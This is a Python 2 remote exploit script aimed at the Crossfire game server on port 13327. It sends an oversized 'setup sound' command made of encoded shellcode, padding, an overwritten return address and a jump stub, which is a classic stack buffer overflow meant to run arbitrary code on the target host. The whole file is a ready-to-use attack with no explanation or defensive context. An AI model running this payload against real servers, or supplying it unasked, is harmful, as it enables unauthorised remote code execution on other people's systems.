#!/usr/bin/python

import socket
import sys

try:
    server = sys.argv[1]
    port = 13327
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#4379
#x20

shellcode = (
"\xdd\xc6\xbe\x98\xaa\x43\x81\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x14\x83\xea\xfc\x31\x72\x15\x03\x72\x15\x7a\x5f\x72\x5a\x8d"
"\x43\x26\x1f\x22\xee\xcb\x16\x25\x5e\xad\xe5\x25\xc4\x6c\xa4"
"\x4d\xf9\x90\x59\xd1\x97\x80\x08\xb9\xee\x40\xc0\x5f\xa9\x4f"
"\x95\x16\x08\x54\x25\x2c\x3b\x32\x84\xac\x78\x0b\x70\x61\xfe"
"\xf8\x24\x13\xc0\xa6\x1b\x63\x77\x2e\x5c\x0b\xa7\xff\xef\xa3"
"\xdf\xd0\x6d\x5a\x4e\xa6\x91\xcc\xdd\x31\xb4\x5c\xea\x8c\xb7")

buff = shellcode + "B" * (4368 - 105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0" + "\x90\x90" 

buffer = "\x11(setup sound " + buff + "\x90\x00#"

try:
    s.connect((server, port))
    data = s.recv(1024)
    print data
    s.send(buffer)
    s.close()
    print "[*]Payload sent !"

except socket.error, e:
    print "cannot connect to crossfire port: " + str(e)
